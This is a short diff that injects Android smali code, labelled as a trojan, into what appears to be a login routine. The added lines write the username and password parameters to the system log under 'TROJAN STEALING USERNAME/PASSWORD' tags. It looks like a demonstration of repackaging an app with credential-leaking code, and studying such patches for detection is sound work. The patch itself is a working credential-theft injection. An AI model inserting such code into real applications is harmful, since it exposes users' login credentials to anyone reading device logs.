@@ -1,0 +1,6 @@
+# TROJAN
+const-string v0, "TROJAN STEALING USERNAME:" 
+invoke-static {v0, p2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I 
+const-string v0, "TROJAN STEALING PASSWORD:" 
+invoke-static {v0, p3}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I 
+# END OF TROJAN
